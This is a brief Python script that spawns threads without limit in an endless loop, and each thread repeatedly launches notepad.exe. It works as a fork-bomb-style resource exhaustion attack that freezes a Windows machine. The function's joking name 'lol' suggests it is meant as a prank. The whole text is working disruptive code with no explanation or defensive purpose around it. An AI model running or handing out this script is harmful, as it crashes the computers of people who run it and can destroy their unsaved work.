
import threading
import os

def lol():
	while True:
		os.system("notepad.exe")

while True:
	threading.Thread(target=lol).start()